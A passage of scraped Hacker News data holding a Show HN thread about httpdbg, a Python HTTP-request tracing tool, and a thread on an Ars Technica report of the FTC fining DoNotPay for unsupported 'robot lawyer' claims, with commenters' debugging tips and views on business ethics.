    "commentBody": "Httpdbg – A tool to trace the HTTP requests sent by your Python code (github.com/cle-b)183 points by cle-b 23 hours agohidepastfavorite49 comments Hi, I created httpdbg, a tool for Python developers to easily debug HTTP(S) client requests in Python programs. I developed it because I needed a tool that could help me trace the HTTP requests sent by my tests back to the corresponding methods in our API client. The goal of this tool is to simplify the debugging process, so I designed it to be as simple as possible. It requires no external dependencies, no setup, no superuser privileges, and no code modifications. I'm sharing it with you today because I use it regularly, and it seems like others have found it useful too—so it might be helpful for you as well. Hope you will like it. cle Source: https://github.com/cle-b/httpdbg Documentation: https://httpdbg.readthedocs.io/ A blog post on a use case: https://medium.com/@cle-b/trace-all-your-http-requests-in-py... accounter8or 19 hours agoI've always wanted this. You get so spoiled with the Chrome Dev Tools when using Javascript that you miss it when you don't have it. reply zug_zug 21 hours agoprevI've always used a proxy, like charles proxy, for this exact purpose. A neutral middle-man that gives exact timing/response data. reply nghiatran_uit 10 hours agoparentIt's not as simple as it sounds, it requires a lot of code to capture Python traffic with charles-proxy. For example, you might modify your python code to use a Proxy and accept a self-signed Charles's certificate. If you need a 1-click solution, no dependencies, and no code's required, check out Proxyman with Auto-Setup: https://docs.proxyman.io/automatic-setup/automatic-setup Works with all popular Python libs: request, aiohttp, http.client, urllib3, etc * Disclaimer: I'm Noah, creator of Proxyman. I know a pain point when using Charles, and decided to build a new one, to make life easier. Hope it helps you. reply antman 20 minutes agorootparentIs that only iOS? reply actionfromafar 20 hours agoparentprevThat’s fine if you can, but say you want to trace deployed on stage, or shudders even production. Or you code tests against some CI and can only add Python. reply zug_zug 17 hours agorootparentWell I would never use a script like this at a real job outside of local testing. What you'd want on stage is probably using opentelemetry, which I believe has auto-instrumentation for all network calls. Then you have the data forever and it's in a public, shared platform that is permissioned and everybody knows, and will still exist in 10 years. reply cjbprime 15 hours agoparentprevI'm really surprised this was downvoted. Running e.g. mitmproxy and pointing your Python process at it is absolutely the way to do this. reply Jugurtha 20 hours agoprevThat's pretty cool! I was playing last night and implemented resumable downloads[0] for pip so that it could pick up where it stopped upon a network disconnect or a user interruption. It sucks when large packages, especially ML related, fail at the last second and pip has to download from scratch. This tool would have been nice to have. Thanks a bunch, - [0]: https://asciinema.org/a/1r8HmOLCfHm40nSvEZBqwm89k reply westurner 4 hours agoparentIt is important to check checksums (and signatures, if there are any) of downloaded packages prior to installing them; especially when resuming interrupted downloads. Pip has a hash-checking mode, but it only works if the hashes are listed in the requirements.txt file, and they're the hashes for the target platform. Pipfile.lock supports storeing hashes for multiple platforms, but requirements.txt does not. If the package hashes are retrieved over the same channel as the package, they can be MITM'd too. You can store PyPi package hashes in sigstore. There should be a way for package uploaders to sign their package before uploading. (This is what .asc signatures on PyPi were for. But if they are retrieved over the same channel, cryptographic signatures can also be MITM'd). IMHO (1) twine should prompt to sign the package (with a DID) before uploading the package to PyPi, and (2) after uploading packages, twine should download the package(s) it has uploaded to verify the signature. ; TCP RESET and Content-Range doesn't hash resources. reply judofyr 22 hours agoprevLooks neat! A similar tool for this would be VCR (originally built in Ruby, but ported to other languages since): https://vcrpy.readthedocs.io/en/latest/. This injects itself into the request pipeline, records the result in a local file which can then also be replayed later in tests. It's a quite nice approach when you want to write tests (or just explore) a highly complicated HTTP API without actually hitting it all the time. reply cle-b 22 hours agoparentI really like vrcpy. I used it a lot with pytest in my previous job. httpdbg isn’t exactly the same; the idea is more about seeing HTTP requests in real-time and being able to easily study them. reply seanc 22 hours agoparentprevThe inspection and debugging features this offers are great additions though. I've stared at VCR yaml enough times to not want to ever do it again. reply stuaxo 22 hours agoprevThis is great - It would be good to be be able to have django debug toolbar integration, that way I could see which requests were made to backend APIs without leaving Django. Having tried MITMProxy something like httpdbg is definitely needed. reply diegoallen 21 hours agoparentYou can do that with django debug toolbar. If you have an endpoint that doesn't return HTML, and hence wouldn't render debug toolbar, you can go to django admin (or any other endpoint that would render ddt) and go to the history pane, check other requests and switch to them. reply 10000truths 16 hours agoprevIs there a way to write the trace to a file, instead of spinning up a local web server? reply billconan 22 hours agoprevthis is very useful, but why can it only work with python code? At which level does it intercept the http traffic? do I have to use specific http library? reply tredre3 22 hours agoparentIt seems to intercept calls for some popular http client libs: https://github.com/cle-b/httpdbg/tree/main/httpdbg/hooks reply cle-b 22 hours agoparentprevIt works only with Python code because it intercepts HTTP requests by hooking into certain Python functions. It supports any HTTP library based on Python’s standard socket library. Specifically, it works with libraries like requests, httpx, aiohttp, and urllib3, as well as pytest, providing more detailed information about the initiator of the requests. reply cdfuller 22 hours agoprevIs there a way to use it with jupyter notebooks? `pyhttpdbg -m jupyter notebook` didn't work for me reply cle-b 22 hours agoparentIf you want to trace the HTTP requests in a notebook, you must install the package notebook-httpdbg. This is documented here: https://httpdbg.readthedocs.io/en/latest/notebook/ reply dmurray 17 hours agoprevThis looks great. I have a use case for something similar: detecting calls to the file system. Lots of code I've inherited has a habit of loading configuration from some random network share, then failing when that config got moved or the production host doesn't have the same access. I usually use strace(1) to track these down, but it's nowhere near as ergonomic as this tool. I'm wondering now if I could patch the `open` built-in instead. reply oefrha 7 hours agoparentCPython since 3.8 already has built-in audit events, including open, so you don't need to patch anything or use anything external. Just add an audit hook with sys.addaudithook(). Quick example: import inspect import pathlib import sys def callsite(): try: pathlib.Path(\"/tmp/file\").open() except: pass def audit_hook(event, args): if event == \"open\": path, mode, flags = args print(f\"audit: open({path!r}, {mode!r}, 0o{flags:o})\") # Not using traceback here because traceback will attempt to read the # source file, causing an infinite recursion of audit events. f = inspect.currentframe() while f := f.f_back: print( f'File \"{f.f_code.co_filename}\", line {f.f_lineno}, in {f.f_code.co_name}' ) def main(): sys.addaudithook(audit_hook) callsite() if __name__ == \"__main__\": main() Prints: audit: open('/tmp/file', 'r', 0o100000000) File \"/path/to/python/lib/python3.12/pathlib.py\", line 1013, in open File \"/tmp/audit.py\", line 10, in callsite File \"/tmp/audit.py\", line 26, in main File \"/tmp/audit.py\", line 30, inhttps://docs.python.org/3/library/audit_events.html reply dmurray 3 hours agorootparentSounds perfect. I didn't know of this, but I think I'll start here. reply mcoliver 16 hours agoparentprevIf on Linux or windows you can use Procmon or Instruments on macos. https://github.com/Sysinternals/ProcMon-for-Linux reply zerocool2750 17 hours agoparentprevWent spelunking through the source. I think you absolutely could! There's actually not a whole lot I found that's really http-library specific. It uses the traceback module in a decorator that ends up being manually wrapped around all of the functions of the specific libraries the author cared about. https://github.com/cle-b/httpdbg/blob/main/httpdbg/hooks Should be easy enough to extend this to other libraries. Super cool tool thanks for sharing @dmurray! reply sYnfo 11 hours agoparentprevYou might find the syscall tracing functionality of Cirron useful: https://github.com/s7nfo/Cirron reply nfgrars 22 hours agoprevAlternatively use man (1) ngrep for http or man (1) openssl for https. reply hartator 20 hours agoprevI wonder if the same exists for Ruby? reply ricardo81 22 hours agoprevI could be lost here (C/PHP/Node coder mainly in code I've used) Why is it a special case to track HTTP/s requests, that otherwise couldn't be logged like any other process/function? I'd guess most people use libcurl and you can wrap something around that. I guess I'm lost on why this is HTTP or Python specific, or if it is, fine. reply seanc 22 hours agoparentIn the old days we'd use tcpdump and wireshark for this, but nowadays everything is encrypted up in the application layer so you need this kind of thing. Or tricky key dumping hacks. reply toomuchtodo 21 hours agorootparenthttps://www.charlesproxy.com/ ? reply cle-b 22 hours agoparentprevUnlike other tools such as proxies that allow you to trace HTTP requests, httpdbg makes it possible to link the HTTP request to the Python code that initiated it. This is why it is specific to Python and does not work with other languages. reply ricardo81 22 hours agorootparentI'm still not understanding. If you're coding something up, why wouldn't you know that piece of code does a HTTP/s request? Based on what you said, it sounds like a scenario where a programmer doesn't know how a request was made. Are there examples of scenarios where that's the case? Sounds like a bit of a security nightmare where there's code doing arbitrary requests. reply bityard 21 hours agorootparentMaybe you are working with an application or library that you didn't write, and want to see the raw requests and responses it generates without reading the entirety of the source code. Maybe you are generating HTTP requests through an API and need to see which headers it sets by default, or which headers are or are not getting set due to a misconfiguration or bug. There are probably loads more use cases, and if I actually did programming for a living, I could probably list a lot more. reply ricardo81 21 hours agorootparentThe 3rd party library stuff makes sense, to an extent. But then you're debugging a 3rd party library. reply diegoallen 21 hours agorootparentIf a 3rd party library you depend on has bugs, you have bugs. And you need to either submit a patch to the library or find a workaround. reply ricardo81 21 hours agorootparentOr just not use arbitrary 3rd party stuff hoping it works :) libcurl is used on billions of devices across the world and has plenty of debugging capabilities. MITM proxy works across all languages. reply fragmede 21 hours agorootparentThe NIH is strong in this once. reply whirlwin 21 hours agorootparentprevHere's a concrete scenario for you: Say you are in a team of 10 developers with a huge codebase that has accumulated over 5+ years. If you're new in the team, and you need to understand when a specific HTTP header is sent, or just snoop the value in the payload you otherwise wouldn't be able to see. reply ricardo81 21 hours agorootparentSnooping traffic isn't new though, so what's specific about this tool and Python. reply whirlwin 13 hours agorootparentHow would you snoop outgoing HTTPS traffic otherwise easily anyway? mitmproxy requires some work to set up reply golergka 21 hours agorootparentprev> If you're coding something up, why wouldn't you know that piece of code does a HTTP/s request? Because tracing all side-effects in a huge codebase with a lot of libraries and layers can be a daunting task. Update: if you haven't worked with 20 year old >1m LOC codebase which went through many different teams and doesn't have any documentation whatsoever, you may lack necessary perspective to see value tools like this. reply ricardo81 21 hours agorootparentSounds like people dealing with code they have no idea what it does. No amount of tools are going to help with that. reply actionfromafar 21 hours agorootparentI think you attract downvotes because tools are helpful. If you have a huge unknown codebase, it can be nice to attack it from different angles. Reading code is useful, but observing what it does in runtime can be useful, too. Also, with hairier code, it can be more useful to first observe and prod it like a black box. reply ricardo81 21 hours agorootparentJust the 1 downvote. Yes, \"tools are helpful\", but whether there's a python/http specific tool that doesn't do what more generic tools do remains to be seen. reply robertlagrant 22 hours agoparentprevI think the nice thing about HTTP for this is different parts of the stack can introduce default headers etc and it's helpful to be able to see the actual request after all that processing's been done. reply ricardo81 22 hours agorootparentWith curl there's always CURLOPT_VERBOSE as per the library. reply Too 14 hours agoprev [–] Can recommend Opentelemetry if you need a more comprehensive tool like this. There is a whole library of so called instrumentation that can monkeypatch standard functions and produce traces of them. Traces can also propagate across process and rpc, giving you a complete picture, even in a microservice architecture. reply abhishekjha 8 hours agoparent [–] Is there an example? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "httpdbg is a new tool for Python developers to debug HTTP(S) client requests easily.",
      "It requires no external dependencies, setup, superuser privileges, or code modifications, making it simple to use.",
      "The tool is designed to trace HTTP requests in tests back to API client methods, and it has been found useful by other developers."
    ],
    "commentSummary": [
      "Httpdbg is a new tool for Python developers to trace HTTP(S) requests in their code, created by cle-b.",
      "It simplifies debugging by linking HTTP requests to corresponding methods in the API client without requiring external dependencies, setup, superuser privileges, or code modifications.",
      "The tool supports popular Python libraries such as requests, aiohttp, and urllib3, making it useful for developers who need to trace HTTP requests without using proxies or modifying their code."
    ],
    "points": 183,
    "commentCount": 49,
    "retryCount": 0,
    "time": 1727291892
  },
  {
    "id": 41659324,
    "title": "DoNotPay has to pay $193K for falsely touting untested AI lawyer, FTC says",
    "originLink": "https://arstechnica.com/tech-policy/2024/09/startup-behind-worlds-first-robot-lawyer-to-pay-193k-for-false-ads-ftc-says/",
    "originBody": "\"No lawyer oversight\" — DoNotPay has to pay $193K for falsely touting untested AI lawyer, FTC says You can't \"sue anyone with a click of a button\" without testing it first, FTC says. Ashley Belanger - 9/25/2024, 8:40 PM Enlarge style-photographyiStock / Getty Images Plus reader comments 39 Among the first AI companies that the Federal Trade Commission has exposed as deceiving consumers is DoNotPay—which initially was advertised as \"the world's first robot lawyer\" with the ability to \"sue anyone with the click of a button.\" On Wednesday, the FTC announced that it took action to stop DoNotPay from making bogus claims after learning that the AI startup conducted no testing \"to determine whether its AI chatbot’s output was equal to the level of a human lawyer.\" DoNotPay also did not \"hire or retain any attorneys\" to help verify AI outputs or validate DoNotPay's legal claims. DoNotPay accepted no liability. But to settle the charges that DoNotPay violated the FTC Act, the AI startup agreed to pay $193,000 if the FTC's consent agreement is confirmed following a 30-day public comment period. Additionally, DoNotPay agreed to warn \"consumers who subscribed to the service between 2021 and 2023\" about the \"limitations of law-related features on the service,\" the FTC said. Moving forward, DoNotPay would also be prohibited under the settlement from making baseless claims that any of its features can be substituted for any professional service. A DoNotPay spokesperson told Ars that the company \"is pleased to have worked constructively with the FTC to settle this case and fully resolve these issues, without admitting liability.\" \"The complaint relates to the usage of a few hundred customers some years ago (out of millions of people), with services that have long been discontinued,\" DoNotPay's spokesperson said. The FTC's settlement with DoNotPay is part of a larger agency effort to crack down on deceptive AI claims. Four other AI companies were hit with enforcement actions Wednesday, the FTC said, and FTC Chair Lina Khan confirmed that the agency's so-called \"Operation AI Comply\" will continue monitoring companies' attempts to \"lure consumers into bogus schemes\" or use AI tools to \"turbocharge deception.\" “Using AI tools to trick, mislead, or defraud people is illegal,” Khan said. “The FTC’s enforcement actions make clear that there is no AI exemption from the laws on the books. By cracking down on unfair or deceptive practices in these markets, FTC is ensuring that honest businesses and innovators can get a fair shot and consumers are being protected.” DoNotPay never tested robot lawyer DoNotPay was initially released in 2015 as a free way to contest parking tickets. Soon after, it quickly expanded its services to cover 200 areas of law—aiding with everything from breach of contract claims to restraining orders to insurance claims and divorce settlements. As DoNotPay's legal services expanded, the company defended its innovative approach to replacing lawyers while acknowledging that it was likely on shaky ground. In 2018, DoNotPay CEO Joshua Browder confirmed to the ABA Journal that the legal services were provided with \"no lawyer oversight.\" But he said that he was only \"a bit worried\" about threats to sue DoNotPay for unlicensed practice of law. Because DoNotPay was free, he expected he could avoid some legal challenges. According to the FTC complaint, DoNotPay began charging subscribers $36 every two months in 2019 while making several false claims in ads to apparently drive up subscriptions. Page: 1 2 Next → reader comments 39 Ashley Belanger Ashley is a senior policy reporter for Ars Technica, dedicated to tracking social impacts of emerging policies and new technologies. She is a Chicago-based journalist with 20 years of experience. Advertisement Channel Ars Technica SITREP: F-16 replacement search a signal of F-35 fail? Footage courtesy of Dvids, Boeing, and The United States Navy. SITREP: F-16 replacement search a signal of F-35 fail? Sitrep: Boeing 707 The F-35's next tech upgrade US Navy Gets an Italian Accent SITREP: DOD Resets Ballistic Missile Interceptor program SITREP: DOD's New Long-Range Air-to-Air Missile Aims to \"Outstick\" China Army's New Pistol Has Had Some Misfires Army's Next (Vertical) Lift En Route SITREP: President Trump's Missile Defense Strategy Hybrid Options for US's Next Top Fighter The Air Force’s Senior Citizen Chopper Can’t Retire Yet Ars Live #23: The History and Future of Tech Law Police re-creation of body camera evidence - Pueblo, COArs Technica Visual Labs body camera software with the Dos Palos PDArs Technica He knew his rights; he got tased anyway More videos ← Previous story Next story → Related Stories Today on Ars",
    "commentLink": "https://news.ycombinator.com/item?id=41659324",
    "commentBody": "DoNotPay has to pay $193K for falsely touting untested AI lawyer, FTC says (arstechnica.com)169 points by Brajeshwar 3 hours agohidepastfavorite130 comments ziddoap 3 hours ago>DoNotPay also did not \"hire or retain any attorneys\" to help verify AI outputs or validate DoNotPay's legal claims. Wow, that's brave. Create a wrapper around ChatGPT, call it a lawyer, and never check the output. $193k fine seems like peanuts. Sometimes I think about where I would be in life if I had no moral or ethical qualms. I'd probably be running a company like this. reply sixhobbits 3 hours agoparentDoNotPay predates GPT by quite a bit -- it used to be pretty positively received on HN e.g. https://news.ycombinator.com/item?id=13822289 reply Aurornis 2 hours agorootparent> it used to be pretty positively received on HN I think people love the idea of DoNotPay: A magical internet machine that saves people money and fights back against evil corporations. Before ChatGPT they were basically mad libs for finding and filling out the right form. Helpful for people who couldn't figure out how to navigate situations by themselves. There is real value in this. However, they've also been running the same growth hacking playbooks that people disdain: False advertising, monthly subscriptions for services that most people need in a one-off manner, claiming AI features to be more reliable than they are, releasing untested products on consumers. Once you look past the headline of the company you find they're not entirely altruistic, they're just another startup playing the growth hacking game and all that comes with it. reply zahlman 2 hours agorootparent>they're just another startup playing the growth hacking game When is humanity going to start seeing some patches against these exploits? Is common sense still in beta? reply notatoad 3 minutes agorootparent>When is humanity going to start seeing some patches against these exploits? i think that's called \"consequences\" and it's the subject of the article you're commenting on reply glial 1 hour agorootparentprevIdeally the legal system wouldn't be byzantine and prohibitively expensive for mere mortals to engage with. reply gleenn 34 minutes agorootparentI think the same could be said software engineers. I don't engage with the general public about writing people's next brilliant idea because it's a hige waste of my time when I could be making FAANG bucks talking to people who know that I'm worth it. While I will alwatry to explain to my mom how the internet works etc, it's not economically justifiable to engage laymen tonsolve their probno matter how altruistic it may seem. I still have to pay the bills. How are lawyers any different? reply glial 19 minutes agorootparentLawyers are the interface between the public and the justice system -- which would exist whether software did or not. It's an access and equity issue: people with money have access to the legal system. People without largely don't. reply bell-cot 1 hour agorootparentprevToo bad that the legal system is made of lawyers, whose interests run directly contrary to that ideal. reply digitaltrees 17 minutes agorootparentLegal systems becoming complex predates the emergence of lawyers. Lawyers have also led significant efforts to simplify the law. For example the American Bar Association has consistently created simple model statute frameworks that eventually are adopted. Law is complex because society is complex. reply dylan604 47 minutes agorootparentprev> Is common sense still in beta? Common sense has been deprecated. The system is just waiting for all of the modules with common sense preinstalled to sunset. reply szundi 1 hour agorootparentprevHuman lifespan is too short reply RankingMember 53 minutes agorootparentYep, need some way to image each new brain that comes online with some basics so it's not starting from 0 each time (and what basics to include would be a battle for the ages) reply imoverclocked 19 minutes agorootparentOof, no thanks. Part of our resilience comes from each generation observing and learning what the world actually is without all of the dogma from the previous generation. Instilling a set of basics is probably the worst thing we could do to fight against gaming humanity. reply antisthenes 20 minutes agorootparentprev> common sense still in beta? Common sense was relegated to a legacy feature status after \"clout\" and \"fuck you got mine\" were released. It will not see further updates and will be sunset shortly. Sorry for the inconvenience. reply LegitShady 2 hours agorootparentprevwhen the government regulates it. until then it will continue to the end of time. reply robertlagrant 1 hour agorootparentThere are already laws for false advertising. reply mrguyorama 1 hour agorootparentIn America? Barely. EVERYTHING can be called \"puffery\", which apparently makes it perfectly legal to make outright lies about your product, and if you instead merely pay someone who makes outright lies, apparently that's fine too if you didn't explicitly tell them to make those specific lies! In America, it is legal to call your uncarbonated soft drink \"vitamin water\"! reply whatshisface 2 hours agorootparentprevThere's altruism, running a business, and unrestrained avarice. Sometimes libertarians can be as prone to equating the first two as leftists are the latter. reply thrance 1 hour agorootparentIn your world, it seems the leftists have it figured out. The purpose of a business is always to maximize profit. EDIT: yeah, yeah, I hear you. You can survive on VC money, and maximize share price instead of focusing on profit. You can also be a small business owned by good people just trying to make a living, but then you still have to not get drowned out by more ruthless competition. The purpose of a business is not always to maximize profit. reply dpassens 1 hour agorootparentThe purpose of a business is whatever its owners want it to be. Typically, this is maximizing profit, but it could be anything, like getting paid for what you like to do. reply adventured 1 hour agorootparentprev> The purpose of a business is always to maximize profit. That's false. The purpose of a business is whatever the owners of that business decide. I've known a large number of business owners that chose less profit in exchange for any number of other attributes they valued more than max profit: more of their own time (working less), better serving a local community by donating a lot of resources / air time (media company), paying employees abnormally higher wages (because said employees had been with them a long time and loyalty matters to some people a lot) - and so on and so forth. Max profit is one of a zillion possible attributes to optionally optimize for as the owner of a business. The larger the owner the more say they obviously will tend to have in the culture. Facebook as a prominent public example, hasn't been optimized for max profit at any point in the past decade. They easily could have extracted far more profit than what they did. Zuckerberg, being the voting control shareholder, chose to invest hilariously vast amounts of money into eg the Metaverse / VR. He did that on a personal lark bet, with very little evidence to suggest it would assist in maximizing profit (and at the least he was very wrong in the closer-term 10-15 year span; maybe it'll pay off 20-30 years out, doubtful). The pursuit of max profit is a cultural attribute, a choice, and that's all. It's generally neither a legal requirement nor a moral requirement of a business. reply kbolino 46 minutes agorootparentA majority of the shares in most publicly traded corporations are held by retirement funds, both \"private\" (BlackRock, Vanguard, State Street) and public (FERS, CalPERS, ...). These entities, generally, have no appreciable interest other than maximizing profit. They are all regulated financial entities, even the private ones are quasi-governmental (e.g., BlackRock has close business relationships with the Federal Reserve), and the public ones are just straight up government agencies. So, in a pretty real way, there is a legal requirement, though like many such things in the United States today, it is not properly formalized. reply AStonesThrow 1 hour agorootparentprevIt's funny: the profit thing keeps being parroted here of all places, Y Combinator, when we know all too well that there are scads of businesses, especially today, that are bleeding millions and hemorrhaging cash, just to disrupt an industry sector, just to amass assets/user data, or just to amass a customer base and get sold off. So no, profit is not a universal motive. But it's a popular one; if you have a conventional business and you expect to stay solvent year-over-year, then you make profits, you stay in the black, yes? Nobody can prognosticate when the lean years will come, and so you watch that bottom line and keep as much cushion as possible, to ride out a bad year or two. Furthermore, if a business is competing with other businesses, that's going to moderate the profit motive with market share and other considerations. But I would say that publicly-traded companies have the strongest impetus to profit and satisfy shareholders. The publicly-traded space is far more constrained than other businesses or entities, such as charities, public interest groups, political action, NGOs, etc. reply gortok 1 hour agorootparentprev> it used to be pretty positively received on HN Doesn’t that call into question the decision making of folks on HN rather than being a positive view of the product? reply bongodongobob 41 minutes agorootparentYep. Turns out HN is just avg people that think they're really smart because they know how to write code. reply ahmeneeroe-v2 3 hours agorootparentprevYes! I used this \"AI\" tool to help a friend write a letter to her landlord. It was not at all \"generative AI\" and seemed to just paste modules together based on her answers to its questionnaire. To your second point, it's very funny how OpenAI seems to have soured the tech crowd on tech. reply kibwen 2 hours agorootparentThe race to the bottom in the ruthless and relentless pursuit of profit is what soured us on tech, and the AI hype train is but one in a long procession. reply faangguyindia 2 hours agorootparentprevIt's love and hate relationship with AI. All engineers I know in tech are bashing AI left and right and going home to work on AI projects in their free time. reply dukeyukey 2 hours agorootparentYou can simultanously believe that AI: * Is massively overhyped by certain persons and companies, and * Is both interesting and has loads of promise, so is worth working on in your own time They aren't contradictory at all. reply bee_rider 2 hours agorootparentActually, I think they are the opposite of contradictory. This tech is dumb, funny, new, and maybe it has potential in the right (low-stakes) applications. Meanwhile, I dunno, I have some begrudging admiration for the folks getting rich selling premium GEMMs, but eventually they are going to piss off all their investors and cause a giant mess. Like good luck guys, get that money, but please don’t take us all down with you. reply whatshisface 2 hours agorootparentprevThe ship is sinking, and we're swimming towards the iceberg. reply shadowgovt 44 minutes agorootparentprevPretty classic hacker behavior. \"This sucks. Now if you'll excuse me, I'm going to go make it better because everyone else working on it is an idiot and I, alone, see the True Way Forward.\" reply ziddoap 3 hours agorootparentprev>To your second point, it's very funny how OpenAI seems to have soured the tech crowd on tech. In this particular case, I'm not sour because of OpenAI. I am sour because of deceptive and gross business practices highlighted in the article. reply throwaway918299 33 minutes agorootparentI'm not soured on tech. I'm soured on the tech industry. I think there's quite a difference between these two things. Using OpenAI as an example. ChatGPT is wonderful for the things it's made for. It's a tool, and a great one but that's all it is. But OpenAI itself is a terrible company and Sam Altman is a power hungry conman that borders on snakeoil salesman. And I'm soured on people like the CEO of my company who wants to shove a GPT chatbot into our application to do things that it's not at all good at or made for because they see dollar signs. reply ahmeneeroe-v2 2 hours agorootparentprevIt worked as well as any other eighteen dollar a month lawyer back when I tried it in 2017/2018. It was actually free back then I used it the one time and felt grateful enough for the help that I signed up for one cycle and then cancelled (since I didn't have a continued need for it). Nothing gross or deceptive. reply ziddoap 2 hours agorootparent>Nothing gross or deceptive. They just had to pay a fine for deceptive advertising. The article lists a number of other deceptive and immoral business practices. reply ahmeneeroe-v2 2 hours agorootparentI actually used the service in question during that time frame and did not feel deceived by their advertising. In fact, I felt good enough about the experience that I threw them a few bucks after the fact to compensate them for some of the value that they gave me. You read an article about it and 7 years later and are convinced they are crooks. reply swores 1 hour agorootparent> You read an article about it and 7 years later and are convinced they are crooks. Actually, you read an article and assumed that your anecdotal experience from 7 years ago is more reflective of how a business operates than a current year investigation into that company by a federal agency. Nobody is arguing that they deceived you personally 7 years ago. reply ziddoap 2 hours agorootparentprevI hold the FTC in higher regard than I do your personal experience when it comes to this matter. reply thfuran 3 hours agorootparentprevWasn't the tech crowd getting soured on tech by all the ads eating the world? reply miah_ 2 hours agorootparentBasically every action the big tech companies FAANG, MS, HP etc have all done for the past decade+ has been detrimental to users. Oh sure yes I want ads in my Operating System and I want every browser to be Chrome with a mask, oh right I also want to pay a subscription to use a printer. Just absolutely bonkers brains in power at tech companies lately. reply shadowgovt 42 minutes agorootparentActually, of all of these, every browser being Chrome with a mask has been kind of nice as a web developer. Never have I had to invest fewer resources in wrestling browser quirks to the ground. reply swatcoder 2 hours agorootparentprev> To your second point, it's very funny how OpenAI seems to have soured the tech crowd on tech. They represent an amplifier for the enshittening that was already souring the tech crown on tech. LLM's used in this sort of way, which is exactly OpenAI's trillion dollar bet, will just make products appear to have larger capabilities while simultaneously making many capabilities far less reliable. Most of the \"win\" in cases like this is for the product vendor cutting capital costs of development while inflating their marketability in the short term, at the expense of making everything they let it touch get more unpredictable and inconsistent. Optimistic/naive users jump in for the market promise of new and more dynamic features, but aren't being coached to anticipate the tradeoff. It's the same thing we've been seeing in digital products for the last 15 years, and manufactured products for the last 40, but cranked up by an order of magnitude. It's exhausting and disheartening. reply add-sub-mul-div 2 hours agorootparentprevAI helps our lives in many ways and it's a shame that the LLM era has perverted the term with the same bad smells and scamminess of the NFT era. reply onemoresoop 2 hours agorootparentIt goes both ways. AI is used in both benefic ways as well as malefic ones. I don't think it's a net positive but that's just my opinion. reply ziddoap 3 hours agorootparentprevNot sure about the history, I based my comment on this quote from the article: >[...] DoNotPay's legal service [...] relying on an API with OpenAI's ChatGPT. Perhaps they rolled their own chatbot then later switched to ChatGPT? Either way, they probably should have a lawyer involved at some point in the process. reply ahmeneeroe-v2 2 hours agorootparentYes I think you are right about that. Someone else called it \"mad libs\" and that is very much what it felt like back in 2017/18. Idk why they needed to have a lawyer involved though. Many processes in life just need an \"official\" sounding response: to get to the next phase, or open the gate to talk to a real human, or even to close the issue with a positive result. Many people are not able to conjure up an \"official\" sounding response from nothing, so these chatbot/ChatGPTs are great ways for them to generate a response to use for their IRL need (parking ticket, letter to landlord, etc). reply everforward 2 hours agorootparent\"Lawyer\" is a regulated term that comes with a lot of expectations of the \"lawyer\" (liability for malpractice, a bunch of duties, etc). You can't just say that something is a lawyer any more than you could do the same with doctors or police officers. Machines are also not allowed to be the \"author\" of court documents if they actually get to court (so far as I'm aware). A lawyer has to sign off and claim it as their own work, and doing so without the lawyer reading it is pretty taboo (I think maybe sanctionable by the BAR but I could be wrong). reply ahmeneeroe-v2 24 minutes agorootparent>You can't just say that something is a lawyer any more than you could do the same with doctors or police officers Do you think WebMD should be renamed? Lawyers seem to be better at defending their turf than doctors or cops. reply dragonwriter 3 hours agorootparentprevMy understanding is that they had much more linear automation of very specific, narrow, high-frequency processes — basically form letters plus some process automation — before they got GPT and decided they could do a lot more “lawyer” things with it. reply hinkley 21 minutes agorootparentprevOn a long enough timeline we all (with the exception of narcissists) see our younger selves as little idiots. reply alexey-salmin 1 hour agoparentprevGiven how bad an average attorney is, I wonder if chatgpt would actually be an improvement. reply ryandrake 3 hours agoparentprev> Sometimes I think about where I would be in life if I had no moral or ethical qualms. I'd probably be running a company like this. I think about this all the time. If I didn’t have a conscience, I would be retired by now. reply whiplash451 3 hours agorootparentYou might be retiring in jail, though. reply rollcat 2 hours agorootparentUnfortunately, \"if it's an app, it's legal\". reply 1vuio0pswjnm7 2 hours agoparentprevIs \"brave\" a euphemism for stupid. reply omoikane 1 hour agorootparentI heard it's the British way of saying \"that's insane\". https://english.stackexchange.com/questions/574974/etymology... reply lexicality 1 hour agorootparentprevI can think of very few situations where someone would say \"wow that's brave\" and not mean \"wow you're an idiot\" reply MangoCoffee 55 minutes agoparentprevAnother Silicon Valley startup looking to get rich quick, following in the footsteps of Uber, Airbnb, DoorDash, WeWork...etc, which have all played in the legal grey areas reply exe34 58 minutes agoparentprev> Sometimes I think about where I would be in life if I had no moral or ethical qualms. I'd probably be running a company like this. I invented smaller variants of deliveroo, airbnb and uber in my mind, around 2008, but I thought no, the only way to make any money would be to exploit people and break laws. honestly, what held me back was more the hassle of lawyers to make it all work. I didn't think I could stomach the effort. reply Narhem 1 hour agoparentprevCrazy people take any advice from people without citing the exact legal clause. reply pdabbadabba 1 hour agorootparentThen you must find it very frustrating to actually receive legal advice, because it is often more complicated than that and there sometimes is no such clause! reply gosub100 2 hours agoparentprev> if I had no moral or ethical qualms. I'd probably be running a company like this. You mean you'd be like any other corporation or property manager or attorney? If you operate in the confines of the law that's all that matters. If you give normal people the same power to litigate as a billionaire, that's a feature, not a bug. reply ziddoap 2 hours agorootparent>If you operate in the confines of the law that's all that matters. This is uh.. Yeah. This is what I meant by having no moral or ethical qualms. There are things that I find immoral which are not illegal. I do not do those things, even though legally I could. reply Palmik 2 hours agoparentprevDid they help regular people defend themselves while saving on legal costs or not? Most of these cases wouldn't be defended at all otherwise. reply ziddoap 2 hours agorootparent>Did they help regular people defend themselves while saving on legal costs or not? Do you get a free pass to do shitty things as long as you do some good things too? I am totally onboard with the concept of the business, just not this particular implementation of it. reply pb7 2 hours agorootparentThat's a little bit how the law works. If you get sentenced for a conviction, your good deeds will affect the decision. Sometimes people get off entirely based on who they are (e.g. athletes, execs, etc). reply ziddoap 1 hour agorootparent>If you get sentenced for a conviction, your good deeds will affect the decision. Definitely a valid point, but I don't feel comfortable applying the same idea to inanimate entities like corporations. >Sometimes people get off entirely based on who they are (e.g. athletes, execs, etc). On a personal level, I have never agreed with this. reply ahmeneeroe-v2 2 hours agorootparentprevThis is exactly the right question. Did they provide value to the user? Yes, nearly any situation in life involving money can be improved with a top lawyer on retainer, but that isn't always viable or economical reply gradyfps 3 hours agoprev\"In 2021, Browder reported that DoNotPay had 250K subscribers; in May 2023, Browder said that DoNotPay had “well over 200,000 subscribers”. To date, DoNotPay has resolved over 2 million cases and offers over 200 use cases on its website. Though DoNotPay has not disclosed its revenue, it charges $36 every two months. Given this, it can be estimated that DoNotPay is generating $54 million in annual revenue, assuming that all 250K users subscribe for 1 year.\"[1] $193K seems like a pittance compared to the money 